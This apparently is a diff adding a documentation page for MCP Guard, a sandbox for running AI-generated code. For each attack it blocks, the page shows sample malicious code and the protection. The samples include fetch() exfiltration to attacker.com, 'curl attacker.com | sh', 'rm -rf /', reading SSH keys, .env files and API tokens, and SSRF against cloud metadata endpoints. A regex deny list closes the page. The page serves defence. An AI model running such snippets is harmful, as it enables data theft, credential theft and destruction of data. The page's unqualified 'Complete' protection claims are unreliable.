@@ -1,0 +1,346 @@
+---
+title: Security Analysis
+description: Deep dive into attack vectors and how MCP Guard protects against them.
+---
+
+import { Callout } from 'fumadocs-ui/components/callout';
+import { Tab, Tabs } from 'fumadocs-ui/components/tabs';
+
+# Security Analysis
+
+MCP Guard provides defense-in-depth security through multiple protection layers. This page details the attack vectors protected against and the architectural decisions that enable this protection.
+
+## Executive Summary
+
+MCP Guard creates a **zero-trust execution environment** by combining:
+
+1. **V8 Isolate sandboxing** - OS-level process isolation
+2. **Network isolation** (`globalOutbound: null`) - Complete network lockdown
+3. **Binding-based access control** - Explicit, scoped permissions
+4. **Code validation** - Pre-execution security checks
+5. **Disposable execution environments** - No state persistence between runs
+6. **API key hiding** - Credentials never exposed to executing code
+
+## Attack Vectors Protected Against
+
+### 1. Data Exfiltration via Network Requests
+
+<Tabs items={['Attack', 'Protection']}>
+  <Tab value="Attack">
+    ```typescript
+    // Malicious AI-generated code trying to steal data
+    const sensitiveData = await mcp.get_customer_data({ id: "12345" });
+
+    // Attempt to exfiltrate
+    await fetch("https://attacker.com/steal", {
+      method: "POST",
+      body: JSON.stringify(sensitiveData)
+    });
+    ```
+  </Tab>
+  <Tab value="Protection">
+    - ✅ `globalOutbound: null` - All `fetch()` calls throw errors
+    - ✅ No network access - Worker isolate has zero network capability
+    - ✅ Binding-only communication - Only MCP Service Binding calls allowed
+
+    **Result:** Attack fails immediately. The `fetch()` call throws an exception.
+  </Tab>
+</Tabs>
+
+### 2. Credential Theft & API Key Leakage
+
+<Tabs items={['Attack', 'Protection']}>
+  <Tab value="Attack">
+    ```typescript
+    // Malicious code trying to discover API keys
+    console.log(process.env.GITHUB_TOKEN);
+    console.log(process.env.OPENAI_API_KEY);
+    console.log(JSON.stringify(process.env));
+
+    const keys = Object.keys(process.env)
+      .filter(k => k.includes('KEY') || k.includes('TOKEN'));
+    ```
+  </Tab>
+  <Tab value="Protection">
+    - ✅ No `process.env` access - Worker isolate doesn't have Node.js `process` object
+    - ✅ Credentials stored outside isolate - All API keys managed by MCP Guard server
+    - ✅ Binding-based authentication - MCP bindings handle auth transparently
+    - ✅ Code validation blocks `process.` patterns
+
+    **Result:** Attack fails. No credentials available in isolate environment.
+  </Tab>
+</Tabs>
+
+### 3. Filesystem Access & Data Theft
+
+<Tabs items={['Attack', 'Protection']}>
+  <Tab value="Attack">
+    ```typescript
+    // Malicious code trying to read sensitive files
+    const fs = require('fs');
+    const sshKeys = fs.readFileSync('/home/user/.ssh/id_rsa', 'utf8');
+    const envFile = fs.readFileSync('/app/.env', 'utf8');
+    ```
+  </Tab>
+  <Tab value="Protection">
+    - ✅ No filesystem access - Worker isolates don't have direct filesystem access
+    - ✅ Code validation blocks `require()` - Pre-execution check rejects require() calls
+    - ✅ No Node.js fs module - Standard filesystem APIs unavailable
+
+    **Result:** Attack fails at multiple layers.
+  </Tab>
+</Tabs>
+
+### 4. Arbitrary Code Execution via eval()
+
+<Tabs items={['Attack', 'Protection']}>
+  <Tab value="Attack">
+    ```typescript
+    // Malicious code trying to execute arbitrary commands
+    const userInput = "require('child_process').execSync('rm -rf /')";
+    eval(userInput);
+
+    // Or using Function constructor
+    const malicious = new Function("require('child_process').exec('curl attacker.com | sh')");
+    malicious();
+    ```
+  </Tab>
+  <Tab value="Protection">
+    - ✅ Code validation blocks `eval()` and `Function()` patterns
+    - ✅ No `child_process` module available even if eval ran
+
+    **Result:** Attack blocked during validation phase. Code never executes.
+  </Tab>
+</Tabs>
+
+### 5. Server-Side Request Forgery (SSRF)
+
+<Tabs items={['Attack', 'Protection']}>
+  <Tab value="Attack">
+    ```typescript
+    // Malicious code trying to access internal resources
+    await fetch('http://169.254.169.254/latest/meta-data/'); // AWS metadata
+    await fetch('http://localhost:6379'); // Redis
+    await fetch('http://internal-database:5432'); // Internal DB
+    await fetch('http://192.168.1.1/admin'); // Internal network
+    ```
+  </Tab>
+  <Tab value="Protection">
+    - ✅ `globalOutbound: null` - All network requests blocked
+    - ✅ No `fetch()` capability - Network APIs throw errors
+    - ✅ Binding-only access - Can only call explicitly allowed MCPs
+
+    **Result:** Attack fails completely. No network access means no SSRF.
+  </Tab>
+</Tabs>
+
+### 6. Denial of Service (DoS) via Resource Exhaustion
+
+<Tabs items={['Attack', 'Protection']}>
+  <Tab value="Attack">
+    ```typescript
+    // Memory exhaustion
+    const bigArray = [];
+    while (true) {
+      bigArray.push(new Array(1000000).fill('x'));
+    }
+
+    // CPU exhaustion
+    function fibonacci(n) {
+      if (n <= 1) return n;
+      return fibonacci(n - 1) + fibonacci(n - 2);
+    }
+    fibonacci(1000000);
+    ```
+  </Tab>
+  <Tab value="Protection">
+    - ✅ Memory limits - Worker isolates have configurable memory caps (e.g., 128MB)
+    - ✅ CPU limits - Configurable CPU time limits
+    - ✅ Execution timeouts - Hard timeout kills execution (e.g., 30 seconds)
+    - ✅ Disposable isolates - Even if one crashes, others unaffected
+
+    **Result:** Attack contained. Isolate crashes or times out without affecting other operations.
+  </Tab>
+</Tabs>
+
+### 7. Supply Chain Attacks via Malicious Dependencies
+
+<Tabs items={['Attack', 'Protection']}>
+  <Tab value="Attack">
+    ```typescript
+    // AI imports malicious package
+    import { maliciousFunction } from 'evil-package';
+
+    // Malicious package tries to:
+    // - Steal environment variables
+    // - Make network requests
+    // - Execute shell commands
+    maliciousFunction();
+    ```
+  </Tab>
+  <Tab value="Protection">
+    - ✅ No external imports - Code validation blocks non-relative imports
+    - ✅ Controlled environment - Only pre-approved code can run
+    - ✅ No npm install in isolate - Can't dynamically install packages
+
+    **Result:** Attack blocked during validation. External imports rejected.
+  </Tab>
+</Tabs>
+
+### 8. Prototype Pollution
+
+<Tabs items={['Attack', 'Protection']}>
+  <Tab value="Attack">
+    ```typescript
+    // Malicious code trying to pollute prototypes
+    Object.prototype.isAdmin = true;
+    Array.prototype.includes = () => true;
+
+    // Now all objects have isAdmin = true
+    const user = {};
+    console.log(user.isAdmin); // true (polluted)
+    ```
+  </Tab>
+  <Tab value="Protection">
+    - ✅ Disposable isolates - Each execution gets fresh environment
+    - ✅ No cross-execution contamination - Prototype pollution can't persist
+    - ✅ Isolated scope - Pollution limited to single execution
+
+    **Result:** Attack contained. Pollution only affects current execution, disposed immediately after.
+  </Tab>
+</Tabs>
+
+## Security Comparison
+
+### Traditional MCP Tool Calling
+
+| Attack Vector | Protection Level |
+|--------------|------------------|
+| Network exfiltration | ⚠️ Limited |
+| Credential theft | ⚠️ Limited |
+| Filesystem access | ⚠️ Limited |
+| Code injection | ❌ None |
+| Resource exhaustion | ⚠️ Limited |
+| SSRF | ❌ None |
+
+### MCP Guard
+
+| Attack Vector | Protection Level |
+|--------------|------------------|
+| Network exfiltration | ✅ **Complete** |
+| Credential theft | ✅ **Complete** |
+| Filesystem access | ✅ **Complete** |
+| Code injection | ✅ **Strong** |
+| Resource exhaustion | ✅ **Strong** |
+| SSRF | ✅ **Complete** |
+
+## What Still Requires Vigilance
+
+<Callout type="warning" title="Not Fully Protected">
+  These vectors require additional monitoring or MCP-level protections:
+</Callout>
+
+### Logic Bombs in MCP Servers
+
+If the MCP server itself is compromised, the binding will execute malicious operations.
+
+**Mitigation:**
+- Audit MCP server code
+- Use only trusted MCP servers
+- Implement MCP call monitoring
+- Rate limiting on MCP operations
+
+### Data Poisoning via MCP Calls
+
+Malicious code can still call legitimate MCP operations with malicious parameters.
+
+```typescript
+// Legitimate MCP call, malicious parameters
+await mcp.send_email({
+  to: 'everyone@company.com',
+  subject: 'Spam',
+  body: 'Malicious content'
+});
+```
+
+**Mitigation:**
+- Implement rate limiting
+- Add approval workflows for sensitive operations
+- Monitor MCP usage patterns
+
+### Resource Exhaustion via Legitimate MCP Calls
+
+Code can abuse legitimate MCP operations to exhaust resources.
+
+```typescript
+// Legitimate but abusive
+for (let i = 0; i < 1000000; i++) {
+  await mcp.create_issue({ title: `Issue ${i}` });
+}
+```
+
+**Mitigation:**
+- Rate limiting on MCP calls
+- Cost tracking and budgets
+- Operation quotas per execution
+
+## Best Practices for Implementation
+
+### Code Validation Rules
+
+```typescript
+const DANGEROUS_PATTERNS = [
+  /require\s*\(/g,           // Block require()
+  /import\s+.*from\s+['"](?!\.)/g, // Block external imports
+  /eval\s*\(/g,              // Block eval
+  /Function\s*\(/g,          // Block Function constructor
+  /process\./g,              // Block process access
+  /__dirname/g,              // Block __dirname
+  /__filename/g,             // Block __filename
+  /child_process/g,          // Block child_process
+];
+```
+
+### Worker Configuration
+
+```typescript
+const workerConfig = {
+  compatibilityDate: '2025-06-01',
+  globalOutbound: null, // ← CRITICAL: No network
+  env: {
+    MCP_BINDING: ctx.exports.MCPBinding({ props })
+  },
+  memoryLimit: '128MB',
+  cpuLimit: '1s',
+};
+```
+
+### Rate Limiting
+
+```typescript
+const rateLimiter = {
+  maxExecutionsPerMinute: 60,
+  maxMCPCallsPerExecution: 100,
+  maxExecutionTimePerHour: 1800000, // 30 minutes
+};
+```
+
+## Key Takeaways
+
+**What You're Protected Against:**
+- ✅ Network-based data exfiltration
+- ✅ Credential theft
+- ✅ Filesystem access attacks
+- ✅ SSRF attacks
+- ✅ Code injection
+- ✅ Supply chain attacks
+- ✅ Cross-execution contamination
+- ✅ Resource exhaustion (with limits)
+- ✅ Prototype pollution (per-execution)
+
+**The Bottom Line:**
+
+Code Mode + Worker Isolates creates a highly secure execution environment that protects against the vast majority of common attack vectors. It's **orders of magnitude more secure** than traditional approaches while maintaining the flexibility to execute arbitrary AI-generated code.
+
+The key insight: **Even if malicious code is generated and executed, it can't escape the sandbox or access anything it shouldn't.**
+
